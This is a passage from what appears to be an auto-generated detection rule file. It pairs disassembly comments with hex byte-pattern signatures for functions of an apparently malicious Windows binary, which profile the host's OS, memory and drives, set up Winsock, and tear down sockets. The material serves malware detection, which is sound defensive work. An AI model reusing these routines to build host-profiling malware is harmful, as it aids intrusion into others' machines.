        .text:0x0040535a  89542450         mov dword [esp + 80],edx
        .text:0x0040535e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405360  8b94245c070000   mov edx,dword [esp + 1884]
        .text:0x00405367  8d442434         lea eax,dword [esp + 52]
        .text:0x0040536b  50               push eax
        .text:0x0040536c  8d4c2444         lea ecx,dword [esp + 68]
        .text:0x00405370  8b82a8000000     mov eax,dword [edx + 168]
        .text:0x00405376  51               push ecx
        .text:0x00405377  50               push eax
        .text:0x00405378  ff151c924000     call dword [0x0040921c]    ;ws2_32.getsockname(0x61616161,local1812)
        .text:0x0040537e  6a00             push 0
        .text:0x00405380  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405382  8d4c2444         lea ecx,dword [esp + 68]
        .text:0x00405386  6a04             push 4
        .text:0x00405388  8d942480010000   lea edx,dword [esp + 384]
        .text:0x0040538f  51               push ecx
        .text:0x00405390  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x00405396  52               push edx
        .text:0x00405397  e8c4f1ffff       call 0x00404560    ;sub_00404560(local1500,local1812,4)
        .text:0x0040539c  6a00             push 0
        .text:0x0040539e  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004053a0  8d842454060000   lea eax,dword [esp + 1620]
        .text:0x004053a7  6a32             push 50
        .text:0x004053a9  8d8c2484010000   lea ecx,dword [esp + 388]
        .text:0x004053b0  50               push eax
        .text:0x004053b1  51               push ecx
        .text:0x004053b2  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004053b8  e8a3f1ffff       call 0x00404560    ;sub_00404560(local1496,local260,50)
        .text:0x004053bd  e80ef9ffff       call 0x00404cd0    ;sub_00404cd0()
        .text:0x004053c2  89842464010000   mov dword [esp + 356],eax
        .text:0x004053c9  6a00             push 0
        .text:0x004053cb  89ac2490020000   mov dword [esp + 656],ebp
        .text:0x004053d2  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004053d4  8d94248c020000   lea edx,dword [esp + 652]
        .text:0x004053db  52               push edx
        .text:0x004053dc  ffd7             call edi    ;kernel32.GetVersionExA(local1228)
        .text:0x004053de  6a00             push 0
        .text:0x004053e0  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004053e2  8b842490020000   mov eax,dword [esp + 656]
        .text:0x004053e9  8b2dd8914000     mov ebp,dword [0x004091d8]
        .text:0x004053ef  83f805           cmp eax,5
        .text:0x004053f2  752a             jnz 0x0040541e
        .text:0x004053f4  8b842494020000   mov eax,dword [esp + 660]
        .text:0x004053fb  85c0             test eax,eax
        .text:0x004053fd  751f             jnz 0x0040541e
        .text:0x004053ff  6a00             push 0
        .text:0x00405401  c644241431       mov byte [esp + 20],49
        .text:0x00405406  c644241500       mov byte [esp + 21],0
        .text:0x0040540b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040540d  8d442410         lea eax,dword [esp + 16]
        .text:0x00405411  8d8c2468010000   lea ecx,dword [esp + 360]
        .text:0x00405418  50               push eax
        .text:0x00405419  51               push ecx
        .text:0x0040541a  ffd3             call ebx    ;kernel32.lstrcpyA(local1520,local1864)
        .text:0x0040541c  eb43             jmp 0x00405461
        .text:0x0040541e  loc_0040541e: [2 XREFS]
        .text:0x0040541e  6a00             push 0
        .text:0x00405420  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405422  8d9424a0000000   lea edx,dword [esp + 160]
        .text:0x00405429  52               push edx
        .text:0x0040542a  ff1508914000     call dword [0x00409108]    ;kernel32.GetSystemInfo(local1720)
        .text:0x00405430  6a00             push 0
        .text:0x00405432  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405434  8b8424b4000000   mov eax,dword [esp + 180]
        .text:0x0040543b  8d4c2410         lea ecx,dword [esp + 16]
        .text:0x0040543f  50               push eax
        .text:0x00405440  8d94246c010000   lea edx,dword [esp + 364]
        .text:0x00405447  51               push ecx
        .text:0x00405448  52               push edx
        .text:0x00405449  c644241c25       mov byte [esp + 28],37
        .text:0x0040544e  c644241d64       mov byte [esp + 29],100
        .text:0x00405453  c644241e00       mov byte [esp + 30],0
        .text:0x00405458  ffd5             call ebp    ;user32.wsprintfA(local1520,local1864)
        .text:0x0040545a  83c40c           add esp,12
        .text:0x0040545d  6a00             push 0
        .text:0x0040545f  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405461  loc_00405461: [1 XREFS]
        .text:0x00405461  6a00             push 0
        .text:0x00405463  c744246440000000 mov dword [esp + 100],64
        .text:0x0040546b  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040546d  8d442460         lea eax,dword [esp + 96]
        .text:0x00405471  50               push eax
        .text:0x00405472  ff1504914000     call dword [0x00409104]    ;kernel32.GlobalMemoryStatusEx(local1784)
        .text:0x00405478  6a00             push 0
        .text:0x0040547a  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x0040547c  8b442468         mov eax,dword [esp + 104]
        .text:0x00405480  8b54246c         mov edx,dword [esp + 108]
        .text:0x00405484  b914000000       mov ecx,20
        .text:0x00405489  e8122a0000       call 0x00407ea0    ;__aullshr(0xfefefefe,0xfefefefe,20)
        .text:0x0040548e  898424b4010000   mov dword [esp + 436],eax
        .text:0x00405495  c744241000000000 mov dword [esp + 16],0
        .text:0x0040549d  33db             xor ebx,ebx
        .text:0x0040549f  loc_0040549f: [1 XREFS]
        .text:0x0040549f  8acb             mov cl,bl
        .text:0x004054a1  6a00             push 0
        .text:0x004054a3  80c142           add cl,66
        .text:0x004054a6  c644242d3a       mov byte [esp + 45],58
        .text:0x004054ab  884c242c         mov byte [esp + 44],cl
        .text:0x004054af  c644242e5c       mov byte [esp + 46],92
        .text:0x004054b4  c644242f00       mov byte [esp + 47],0
        .text:0x004054b9  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004054bb  8d542428         lea edx,dword [esp + 40]
        .text:0x004054bf  52               push edx
        .text:0x004054c0  ff1500914000     call dword [0x00409100]    ;kernel32.GetDriveTypeA(local1840)
        .text:0x004054c6  6a00             push 0
        .text:0x004054c8  8bf8             mov edi,eax
        .text:0x004054ca  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004054cc  83ff03           cmp edi,3
        .text:0x004054cf  7538             jnz 0x00405509
        .text:0x004054d1  6a00             push 0
        .text:0x004054d3  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004054d5  8d442450         lea eax,dword [esp + 80]
        .text:0x004054d9  8d4c2438         lea ecx,dword [esp + 56]
        .text:0x004054dd  50               push eax
        .text:0x004054de  8d54245c         lea edx,dword [esp + 92]
        .text:0x004054e2  51               push ecx
        .text:0x004054e3  8d442430         lea eax,dword [esp + 48]
        .text:0x004054e7  52               push edx
        .text:0x004054e8  50               push eax
        .text:0x004054e9  ff15fc904000     call dword [0x004090fc]    ;kernel32.GetDiskFreeSpaceExA(local1840,local1792,local1824,local1800)
        .text:0x004054ef  6a00             push 0
        .text:0x004054f1  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004054f3  8b442438         mov eax,dword [esp + 56]
        .text:0x004054f7  8b54243c         mov edx,dword [esp + 60]
        .text:0x004054fb  b914000000       mov ecx,20
        .text:0x00405500  e89b290000       call 0x00407ea0    ;__aullshr(16,0xfefefefe,20)
        .text:0x00405505  01442410         add dword [esp + 16],eax
        .text:0x00405509  loc_00405509: [1 XREFS]
        .text:0x00405509  43               inc ebx
        .text:0x0040550a  83fb1a           cmp ebx,26
        .text:0x0040550d  7c90             jl 0x0040549f
        .text:0x0040550f  8b4c2410         mov ecx,dword [esp + 16]
        .text:0x00405513  898c24b8010000   mov dword [esp + 440],ecx
        .text:0x0040551a  e821f9ffff       call 0x00404e40    ;sub_00404e40()
        .text:0x0040551f  8b942460070000   mov edx,dword [esp + 1888]
        .text:0x00405526  6a00             push 0
        .text:0x00405528  898424c0010000   mov dword [esp + 448],eax
        .text:0x0040552f  899424c4010000   mov dword [esp + 452],edx
        .text:0x00405536  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405538  ff15d0904000     call dword [0x004090d0]    ;kernel32.GetTickCount()
        .text:0x0040553e  8bf8             mov edi,eax
        .text:0x00405540  b83bd4b531       mov eax,0x31b5d43b
        .text:0x00405545  f7e7             mul edi
        .text:0x00405547  c1ea18           shr edx,24
        .text:0x0040554a  8d442414         lea eax,dword [esp + 20]
        .text:0x0040554e  52               push edx
        .text:0x0040554f  8d8c24f4030000   lea ecx,dword [esp + 1012]
        .text:0x00405556  50               push eax
        .text:0x00405557  51               push ecx
        .text:0x00405558  ffd5             call ebp    ;user32.wsprintfA(local872,local1860)
        .text:0x0040555a  8bc7             mov eax,edi
        .text:0x0040555c  33d2             xor edx,edx
        .text:0x0040555e  b9005c2605       mov ecx,0x05265c00
        .text:0x00405563  f7f1             div ecx
        .text:0x00405565  b8b17c2195       mov eax,0x95217cb1
        .text:0x0040556a  8bfa             mov edi,edx
        .text:0x0040556c  f7e7             mul edi
        .text:0x0040556e  c1ea15           shr edx,21
        .text:0x00405571  52               push edx
        .text:0x00405572  8d542424         lea edx,dword [esp + 36]
        .text:0x00405576  8d84249c030000   lea eax,dword [esp + 924]
        .text:0x0040557d  52               push edx
        .text:0x0040557e  50               push eax
        .text:0x0040557f  ffd5             call ebp    ;user32.wsprintfA(local972,local1860)
        .text:0x00405581  8bc7             mov eax,edi
        .text:0x00405583  33d2             xor edx,edx
        .text:0x00405585  b980ee3600       mov ecx,0x0036ee80
        .text:0x0040558a  f7f1             div ecx
        .text:0x0040558c  b873b2e745       mov eax,0x45e7b273
        .text:0x00405591  f7e2             mul edx
        .text:0x00405593  c1ea0e           shr edx,14
        .text:0x00405596  52               push edx
        .text:0x00405597  8d542430         lea edx,dword [esp + 48]
        .text:0x0040559b  8d842444030000   lea eax,dword [esp + 836]
        .text:0x004055a2  52               push edx
        .text:0x004055a3  50               push eax
        .text:0x004055a4  ffd5             call ebp    ;user32.wsprintfA(local1072,local1860)
        .text:0x004055a6  83c424           add esp,36
        .text:0x004055a9  b073             mov al,115
        .text:0x004055ab  c644241825       mov byte [esp + 24],37
        .text:0x004055b0  88442419         mov byte [esp + 25],al
        .text:0x004055b4  6a00             push 0
        .text:0x004055b6  c644241e25       mov byte [esp + 30],37
        .text:0x004055bb  8844241f         mov byte [esp + 31],al
        .text:0x004055bf  c644242025       mov byte [esp + 32],37
        .text:0x004055c4  88442421         mov byte [esp + 33],al
        .text:0x004055c8  c644242225       mov byte [esp + 34],37
        .text:0x004055cd  88442423         mov byte [esp + 35],al
        .text:0x004055d1  c644242425       mov byte [esp + 36],37
        .text:0x004055d6  88442425         mov byte [esp + 37],al
        .text:0x004055da  c644242625       mov byte [esp + 38],37
        .text:0x004055df  88442427         mov byte [esp + 39],al
        .text:0x004055e3  c644242800       mov byte [esp + 40],0
        .text:0x004055e8  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004055ea  8d8c2428030000   lea ecx,dword [esp + 808]
        .text:0x004055f1  688ca54000       push 0x0040a58c
        .text:0x004055f6  51               push ecx
        .text:0x004055f7  8d942494030000   lea edx,dword [esp + 916]
        .text:0x004055fe  6888a54000       push 0x0040a588
        .text:0x00405603  52               push edx
        .text:0x00405604  8d842400040000   lea eax,dword [esp + 1024]
        .text:0x0040560b  6884a54000       push 0x0040a584
        .text:0x00405610  8d4c242c         lea ecx,dword [esp + 44]
        .text:0x00405614  50               push eax
        .text:0x00405615  8d942472020000   lea edx,dword [esp + 626]
        .text:0x0040561c  51               push ecx
        .text:0x0040561d  52               push edx
        .text:0x0040561e  ffd5             call ebp    ;user32.wsprintfA(local1278,local1856)
        .text:0x00405620  83c420           add esp,32
        .text:0x00405623  6a00             push 0
        .text:0x00405625  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405627  8b842464070000   mov eax,dword [esp + 1892]
        .text:0x0040562e  8d8c24c4010000   lea ecx,dword [esp + 452]
        .text:0x00405635  50               push eax
        .text:0x00405636  51               push ecx
        .text:0x00405637  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x0040563d  e82ef1ffff       call 0x00404770    ;sub_00404770(local1428,arg2)
        .text:0x00405642  6a00             push 0
        .text:0x00405644  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405646  8d9424f6010000   lea edx,dword [esp + 502]
        .text:0x0040564d  6a32             push 50
        .text:0x0040564f  8d842458040000   lea eax,dword [esp + 1112]
        .text:0x00405656  52               push edx
        .text:0x00405657  50               push eax
        .text:0x00405658  e8b3fbffff       call 0x00405210    ;sub_00405210(local772,local1378,50)
        .text:0x0040565d  83c40c           add esp,12
        .text:0x00405660  6a00             push 0
        .text:0x00405662  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405664  8d8c2454050000   lea ecx,dword [esp + 1364]
        .text:0x0040566b  6800010000       push 256
        .text:0x00405670  8d942458040000   lea edx,dword [esp + 1112]
        .text:0x00405677  51               push ecx
        .text:0x00405678  52               push edx
        .text:0x00405679  e8f2faffff       call 0x00405170    ;sub_00405170(local516,local772,local516,256)
        .text:0x0040567e  83c40c           add esp,12
        .text:0x00405681  bf70a54000       mov edi,0x0040a570
        .text:0x00405686  85c0             test eax,eax
        .text:0x00405688  7407             jz 0x00405691
        .text:0x0040568a  8dbc2454050000   lea edi,dword [esp + 1364]
        .text:0x00405691  loc_00405691: [1 XREFS]
        .text:0x00405691  6a00             push 0
        .text:0x00405693  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x00405695  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x0040569b  8d842428020000   lea eax,dword [esp + 552]
        .text:0x004056a2  57               push edi
        .text:0x004056a3  50               push eax
        .text:0x004056a4  e8c7f0ffff       call 0x00404770    ;sub_00404770(local1328,0x0040a570)
        .text:0x004056a9  6a00             push 0
        .text:0x004056ab  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004056ad  8d8c24c4000000   lea ecx,dword [esp + 196]
        .text:0x004056b4  68c8010000       push 456
        .text:0x004056b9  51               push ecx
        .text:0x004056ba  8b8c2464070000   mov ecx,dword [esp + 1892]
        .text:0x004056c1  e88acbffff       call 0x00402250    ;sub_00402250(arg0,local1684,456)
        .text:0x004056c6  6a00             push 0
        .text:0x004056c8  8bf8             mov edi,eax
        .text:0x004056ca  ffd6             call esi    ;kernel32.Sleep(0)
        .text:0x004056cc  8bc7             mov eax,edi
        .text:0x004056ce  5f               pop edi
        .text:0x004056cf  5e               pop esi
        .text:0x004056d0  5d               pop ebp
        .text:0x004056d1  5b               pop ebx
        .text:0x004056d2  81c444070000     add esp,1860
        .text:0x004056d8  c3               ret 
        */
        $c32 = { 81 EC 44 07 00 00 53 55 56 8B 35 ?? ?? ?? ?? 57 6A 00 FF D6 6A 00 C6 44 24 ?? 25 C6 44 24 ?? 64 C6 44 24 ?? 00 FF D6 6A 00 C6 84 24 ?? ?? ?? ?? 66 C7 84 24 ?? ?? ?? ?? 00 00 00 00 FF D6 BD 9C 00 00 00 6A 00 89 AC 24 ?? ?? ?? ?? FF D6 8B 84 24 ?? ?? ?? ?? 8B 1D ?? ?? ?? ?? 8D 8C 24 ?? ?? ?? ?? 50 51 FF D3 6A 00 FF D6 8B 3D ?? ?? ?? ?? 8D 94 24 ?? ?? ?? ?? 52 FF D7 6A 00 FF D6 6A 00 FF D6 8D 84 24 ?? ?? ?? ?? 68 00 01 00 00 8D 8C 24 ?? ?? ?? ?? 50 51 E8 ?? ?? ?? ?? 83 C4 0C 6A 00 FF D6 33 D2 C7 44 24 ?? 10 00 00 00 89 54 24 ?? 89 54 24 ?? 89 54 24 ?? 52 89 54 24 ?? FF D6 8B 94 24 ?? ?? ?? ?? 8D 44 24 ?? 50 8D 4C 24 ?? 8B 82 ?? ?? ?? ?? 51 50 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8D 4C 24 ?? 6A 04 8D 94 24 ?? ?? ?? ?? 51 8B 0D ?? ?? ?? ?? 52 E8 ?? ?? ?? ?? 6A 00 FF D6 8D 84 24 ?? ?? ?? ?? 6A 32 8D 8C 24 ?? ?? ?? ?? 50 51 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? E8 ?? ?? ?? ?? 89 84 24 ?? ?? ?? ?? 6A 00 89 AC 24 ?? ?? ?? ?? FF D6 8D 94 24 ?? ?? ?? ?? 52 FF D7 6A 00 FF D6 8B 84 24 ?? ?? ?? ?? 8B 2D ?? ?? ?? ?? 83 F8 05 75 ?? 8B 84 24 ?? ?? ?? ?? 85 C0 75 ?? 6A 00 C6 44 24 ?? 31 C6 44 24 ?? 00 FF D6 8D 44 24 ?? 8D 8C 24 ?? ?? ?? ?? 50 51 FF D3 EB ?? 6A 00 FF D6 8D 94 24 ?? ?? ?? ?? 52 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 84 24 ?? ?? ?? ?? 8D 4C 24 ?? 50 8D 94 24 ?? ?? ?? ?? 51 52 C6 44 24 ?? 25 C6 44 24 ?? 64 C6 44 24 ?? 00 FF D5 83 C4 0C 6A 00 FF D6 6A 00 C7 44 24 ?? 40 00 00 00 FF D6 8D 44 24 ?? 50 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 44 24 ?? 8B 54 24 ?? B9 14 00 00 00 E8 ?? ?? ?? ?? 89 84 24 ?? ?? ?? ?? C7 44 24 ?? 00 00 00 00 33 DB 8A CB 6A 00 80 C1 42 C6 44 24 ?? 3A 88 4C 24 ?? C6 44 24 ?? 5C C6 44 24 ?? 00 FF D6 8D 54 24 ?? 52 FF 15 ?? ?? ?? ?? 6A 00 8B F8 FF D6 83 FF 03 75 ?? 6A 00 FF D6 8D 44 24 ?? 8D 4C 24 ?? 50 8D 54 24 ?? 51 8D 44 24 ?? 52 50 FF 15 ?? ?? ?? ?? 6A 00 FF D6 8B 44 24 ?? 8B 54 24 ?? B9 14 00 00 00 E8 ?? ?? ?? ?? 01 44 24 ?? 43 83 FB 1A 7C ?? 8B 4C 24 ?? 89 8C 24 ?? ?? ?? ?? E8 ?? ?? ?? ?? 8B 94 24 ?? ?? ?? ?? 6A 00 89 84 24 ?? ?? ?? ?? 89 94 24 ?? ?? ?? ?? FF D6 FF 15 ?? ?? ?? ?? 8B F8 B8 3B D4 B5 31 F7 E7 C1 EA 18 8D 44 24 ?? 52 8D 8C 24 ?? ?? ?? ?? 50 51 FF D5 8B C7 33 D2 B9 00 5C 26 05 F7 F1 B8 B1 7C 21 95 8B FA F7 E7 C1 EA 15 52 8D 54 24 ?? 8D 84 24 ?? ?? ?? ?? 52 50 FF D5 8B C7 33 D2 B9 80 EE 36 00 F7 F1 B8 73 B2 E7 45 F7 E2 C1 EA 0E 52 8D 54 24 ?? 8D 84 24 ?? ?? ?? ?? 52 50 FF D5 83 C4 24 B0 73 C6 44 24 ?? 25 88 44 24 ?? 6A 00 C6 44 24 ?? 25 88 44 24 ?? C6 44 24 ?? 25 88 44 24 ?? C6 44 24 ?? 25 88 44 24 ?? C6 44 24 ?? 25 88 44 24 ?? C6 44 24 ?? 25 88 44 24 ?? C6 44 24 ?? 00 FF D6 8D 8C 24 ?? ?? ?? ?? 68 8C A5 40 00 51 8D 94 24 ?? ?? ?? ?? 68 88 A5 40 00 52 8D 84 24 ?? ?? ?? ?? 68 84 A5 40 00 8D 4C 24 ?? 50 8D 94 24 ?? ?? ?? ?? 51 52 FF D5 83 C4 20 6A 00 FF D6 8B 84 24 ?? ?? ?? ?? 8D 8C 24 ?? ?? ?? ?? 50 51 8B 0D ?? ?? ?? ?? E8 ?? ?? ?? ?? 6A 00 FF D6 8D 94 24 ?? ?? ?? ?? 6A 32 8D 84 24 ?? ?? ?? ?? 52 50 E8 ?? ?? ?? ?? 83 C4 0C 6A 00 FF D6 8D 8C 24 ?? ?? ?? ?? 68 00 01 00 00 8D 94 24 ?? ?? ?? ?? 51 52 E8 ?? ?? ?? ?? 83 C4 0C BF 70 A5 40 00 85 C0 74 ?? 8D BC 24 ?? ?? ?? ?? 6A 00 FF D6 8B 0D ?? ?? ?? ?? 8D 84 24 ?? ?? ?? ?? 57 50 E8 ?? ?? ?? ?? 6A 00 FF D6 8D 8C 24 ?? ?? ?? ?? 68 C8 01 00 00 51 8B 8C 24 ?? ?? ?? ?? E8 ?? ?? ?? ?? 6A 00 8B F8 FF D6 8B C7 5F 5E 5D 5B 81 C4 44 07 00 00 C3 }
        /*
function at 0x00401610@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - initialize Winsock library
        .text:0x00401610  
        .text:0x00401610  FUNC: int thiscall sub_00401610( void * ecx, ) [4 XREFS] 
        .text:0x00401610  
        .text:0x00401610  Stack Variables: (offset from initial top of stack)
        .text:0x00401610            -4: int local4
        .text:0x00401610           -12: int local12
        .text:0x00401610          -412: int local412
        .text:0x00401610          -416: int local416
        .text:0x00401610          -420: int local420
        .text:0x00401610          -421: int local421
        .text:0x00401610          -422: int local422
        .text:0x00401610          -423: int local423
        .text:0x00401610          -424: int local424
        .text:0x00401610  
        .text:0x00401610  6aff             push 0xffffffff
        .text:0x00401612  6848834000       push 0x00408348
        .text:0x00401617  64a100000000     fs: mov eax,dword [0x00000000]
        .text:0x0040161d  50               push eax
        .text:0x0040161e  64892500000000   fs: mov dword [0x00000000],esp
        .text:0x00401625  81ec9c010000     sub esp,412
        .text:0x0040162b  56               push esi
        .text:0x0040162c  8bf1             mov esi,ecx
        .text:0x0040162e  8974240c         mov dword [esp + 12],esi
        .text:0x00401632  8d4e04           lea ecx,dword [esi + 4]
        .text:0x00401635  e8c6f9ffff       call 0x00401000    ;sub_00401000(ecx)
        .text:0x0040163a  8d4e2c           lea ecx,dword [esi + 44]
        .text:0x0040163d  c78424a801000000 mov dword [esp + 424],0
        .text:0x00401648  e8b3f9ffff       call 0x00401000    ;sub_00401000(ecx)
        .text:0x0040164d  8d4e54           lea ecx,dword [esi + 84]
        .text:0x00401650  c68424a801000001 mov byte [esp + 424],1
        .text:0x00401658  e8a3f9ffff       call 0x00401000    ;sub_00401000(ecx)
        .text:0x0040165d  8d4e7c           lea ecx,dword [esi + 124]
        .text:0x00401660  c68424a801000002 mov byte [esp + 424],2
        .text:0x00401668  e893f9ffff       call 0x00401000    ;sub_00401000(ecx)
        .text:0x0040166d  8d442410         lea eax,dword [esp + 16]
        .text:0x00401671  c68424a801000003 mov byte [esp + 424],3
        .text:0x00401679  50               push eax
        .text:0x0040167a  6802020000       push 514
        .text:0x0040167f  c70668924000     mov dword [esi],0x00409268
        .text:0x00401685  ff1528924000     call dword [0x00409228]    ;ws2_32.WSAStartup(514,local412)
        .text:0x0040168b  6a00             push 0
        .text:0x0040168d  6a00             push 0
        .text:0x0040168f  6a01             push 1
        .text:0x00401691  6a00             push 0
        .text:0x00401693  ff1584904000     call dword [0x00409084]    ;kernel32.CreateEventA(0,1,0,0)
        .text:0x00401699  8d4c2404         lea ecx,dword [esp + 4]
        .text:0x0040169d  8986ac000000     mov dword [esi + 172],eax
        .text:0x004016a3  6a05             push 5
        .text:0x004016a5  c686b000000000   mov byte [esi + 176],0
        .text:0x004016ac  c786a8000000ffff mov dword [esi + 168],0xffffffff
        .text:0x004016b6  b075             mov al,117
        .text:0x004016b8  51               push ecx
        .text:0x004016b9  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004016bf  6894a54000       push 0x0040a594
        .text:0x004016c4  c64424104b       mov byte [esp + 16],75
        .text:0x004016c9  88442411         mov byte [esp + 17],al
        .text:0x004016cd  c644241247       mov byte [esp + 18],71
        .text:0x004016d2  c64424136f       mov byte [esp + 19],111
        .text:0x004016d7  88442414         mov byte [esp + 20],al
        .text:0x004016db  e8802e0000       call 0x00404560    ;sub_00404560(0x0040a594,local424,5)
        .text:0x004016e0  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004016e6  6834ac4000       push 0x0040ac34
        .text:0x004016eb  e800300000       call 0x004046f0    ;sub_004046f0(0x0040ac34)
        .text:0x004016f0  8b0dd4aa4000     mov ecx,dword [0x0040aad4]
        .text:0x004016f6  50               push eax
        .text:0x004016f7  6834ac4000       push 0x0040ac34
        .text:0x004016fc  68a0a74000       push 0x0040a7a0
        .text:0x00401701  e84a320000       call 0x00404950    ;sub_00404950(0x0040a7a0,0x0040ac34,sub_004046f0(0x0040ac34))
        .text:0x00401706  8b8c24a0010000   mov ecx,dword [esp + 416]
        .text:0x0040170d  8bc6             mov eax,esi
        .text:0x0040170f  5e               pop esi
        .text:0x00401710  64890d00000000   fs: mov dword [0x00000000],ecx
        .text:0x00401717  81c4a8010000     add esp,424
        .text:0x0040171d  c3               ret 
        */
        $c33 = { 6A FF 68 48 83 40 00 64 A1 ?? ?? ?? ?? 50 64 89 25 ?? ?? ?? ?? 81 EC 9C 01 00 00 56 8B F1 89 74 24 ?? 8D 4E ?? E8 ?? ?? ?? ?? 8D 4E ?? C7 84 24 ?? ?? ?? ?? 00 00 00 00 E8 ?? ?? ?? ?? 8D 4E ?? C6 84 24 ?? ?? ?? ?? 01 E8 ?? ?? ?? ?? 8D 4E ?? C6 84 24 ?? ?? ?? ?? 02 E8 ?? ?? ?? ?? 8D 44 24 ?? C6 84 24 ?? ?? ?? ?? 03 50 68 02 02 00 00 C7 06 68 92 40 00 FF 15 ?? ?? ?? ?? 6A 00 6A 00 6A 01 6A 00 FF 15 ?? ?? ?? ?? 8D 4C 24 ?? 89 86 ?? ?? ?? ?? 6A 05 C6 86 ?? ?? ?? ?? 00 C7 86 ?? ?? ?? ?? FF FF FF FF B0 75 51 8B 0D ?? ?? ?? ?? 68 94 A5 40 00 C6 44 24 ?? 4B 88 44 24 ?? C6 44 24 ?? 47 C6 44 24 ?? 6F 88 44 24 ?? E8 ?? ?? ?? ?? 8B 0D ?? ?? ?? ?? 68 34 AC 40 00 E8 ?? ?? ?? ?? 8B 0D ?? ?? ?? ?? 50 68 34 AC 40 00 68 A0 A7 40 00 E8 ?? ?? ?? ?? 8B 8C 24 ?? ?? ?? ?? 8B C6 5E 64 89 0D ?? ?? ?? ?? 81 C4 A8 01 00 00 C3 }
        /*
function at 0x004021b0@9324d1a8ae37a36ae560c37448c9705a with 1 features:
          - set socket configuration
        .text:0x004021b0  
        .text:0x004021b0  FUNC: int thiscall_caller sub_004021b0( void * ecx, ) [12 XREFS] 
        .text:0x004021b0  
        .text:0x004021b0  Stack Variables: (offset from initial top of stack)
        .text:0x004021b0            -2: int local2
        .text:0x004021b0            -4: int local4
        .text:0x004021b0  
        .text:0x004021b0  51               push ecx
        .text:0x004021b1  56               push esi
        .text:0x004021b2  57               push edi
        .text:0x004021b3  8b3d78904000     mov edi,dword [0x00409078]
        .text:0x004021b9  8bf1             mov esi,ecx
        .text:0x004021bb  6a00             push 0
        .text:0x004021bd  ffd7             call edi    ;kernel32.Sleep(0)
        .text:0x004021bf  6a00             push 0
        .text:0x004021c1  66c744240c0100   mov word [esp + 12],1
        .text:0x004021c8  66c744240e0000   mov word [esp + 14],0
        .text:0x004021cf  ffd7             call edi    ;kernel32.Sleep(0)
        .text:0x004021d1  8b8ea8000000     mov ecx,dword [esi + 168]
        .text:0x004021d7  8d442408         lea eax,dword [esp + 8]
        .text:0x004021db  6a04             push 4
        .text:0x004021dd  50               push eax
        .text:0x004021de  6880000000       push 128
        .text:0x004021e3  68ffff0000       push 0x0000ffff
        .text:0x004021e8  51               push ecx
        .text:0x004021e9  ff152c924000     call dword [0x0040922c]    ;ws2_32.setsockopt(0x61616161,0x0000ffff,128,local4)
        .text:0x004021ef  6a00             push 0
        .text:0x004021f1  ffd7             call edi    ;kernel32.Sleep(0)
        .text:0x004021f3  8b96a8000000     mov edx,dword [esi + 168]
        .text:0x004021f9  52               push edx
        .text:0x004021fa  ff15a0904000     call dword [0x004090a0]    ;kernel32.CancelIo(0x61616161)
        .text:0x00402200  6a00             push 0
        .text:0x00402202  ffd7             call edi    ;kernel32.Sleep(0)
        .text:0x00402204  8d86b0000000     lea eax,dword [esi + 176]
        .text:0x0040220a  6a00             push 0
        .text:0x0040220c  50               push eax
        .text:0x0040220d  ff159c904000     call dword [0x0040909c]    ;kernel32.InterlockedExchange(ecx,0)
        .text:0x00402213  6a00             push 0
        .text:0x00402215  ffd7             call edi    ;kernel32.Sleep(0)
        .text:0x00402217  8b8ea8000000     mov ecx,dword [esi + 168]
        .text:0x0040221d  51               push ecx
        .text:0x0040221e  ff1504924000     call dword [0x00409204]    ;ws2_32.closesocket(0x61616161)
        .text:0x00402224  6a00             push 0
        .text:0x00402226  ffd7             call edi    ;kernel32.Sleep(0)
        .text:0x00402228  8b96ac000000     mov edx,dword [esi + 172]
        .text:0x0040222e  52               push edx
        .text:0x0040222f  ff1598904000     call dword [0x00409098]    ;kernel32.SetEvent(0x61616161)
        .text:0x00402235  6a00             push 0
        .text:0x00402237  ffd7             call edi    ;kernel32.Sleep(0)
        .text:0x00402239  c786a8000000ffff mov dword [esi + 168],0xffffffff
        .text:0x00402243  5f               pop edi
        .text:0x00402244  5e               pop esi
        .text:0x00402245  59               pop ecx
        .text:0x00402246  c3               ret 
        */
